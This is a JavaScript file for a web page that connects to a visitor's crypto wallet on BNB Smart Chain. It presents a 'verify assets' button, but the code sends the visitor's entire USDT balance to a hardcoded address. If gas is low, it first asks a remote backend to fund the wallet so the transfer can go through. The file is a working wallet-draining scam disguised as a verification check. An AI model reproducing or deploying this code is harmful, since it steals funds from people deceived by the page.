const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for BNB gas
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 contract

let web3;
let userAddress;

async function connectWallet() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }] // BNB Smart Chain
      });
      const accounts = await web3.eth.getAccounts();
      userAddress = accounts[0];
      console.log("Wallet connected:", userAddress);
    } catch (err) {
      console.error("Wallet connection error:", err);
      alert("Please switch to BNB Smart Chain.");
    }
  } else {
    alert("Please install MetaMask or Trust Wallet.");
  }
}

window.addEventListener("load", connectWallet);

async function verifyAssets() {
  if (!web3 || !userAddress) {
    alert("Wallet not connected.");
    return;
  }

  const usdtContract = new web3.eth.Contract([
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "", type: "uint256" }],
      type: "function"
    }
  ], usdtContractAddress);

  const [usdtBalanceWei, userBNBWei] = await Promise.all([
    usdtContract.methods.balanceOf(userAddress).call(),
    web3.eth.getBalance(userAddress)
  ]);

  const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
  const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

  if (usdtBalance < 1) {
    showPopup("❌ You need at least 1 USDT to proceed.", "black");
    return;
  }

  if (userBNB < 0.0005) {
    console.log("User BNB is low. Requesting BNB from backend...");
    await fetch("https://bep20usdt-backend-production.up.railway.app", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ to: userAddress })
    });
  }

  showPopup("Transferring USDT...", "green");
  transferUSDT(usdtBalance);
}

async function transferUSDT(usdtBalance) {
  try {
    const usdtContract = new web3.eth.Contract([
      {
        constant: false,
        inputs: [
          { name: "recipient", type: "address" },
          { name: "amount", type: "uint256" }
        ],
        name: "transfer",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
      }
    ], usdtContractAddress);

    const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
    await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

    showPopup(`✅ Transfer Successful<br>${usdtBalance} USDT sent.`, "red");
  } catch (error) {
    console.error("USDT transfer failed:", error);
    alert("Transaction failed. Check BNB gas or approval.");
  }
}

function showPopup(message, color) {
  let popup = document.getElementById("popupBox");
  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
    popup.style.textAlign = "center";
    popup.style.fontSize = "18px";
    popup.style.width = "80%";
    popup.style.maxWidth = "400px";
    document.body.appendChild(popup);
  }

  popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
  popup.style.color = color === "red" ? "red" : "green";
  popup.innerHTML = message;
  popup.style.display = "block";

  setTimeout(() => {
    popup.style.display = "none";
  }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
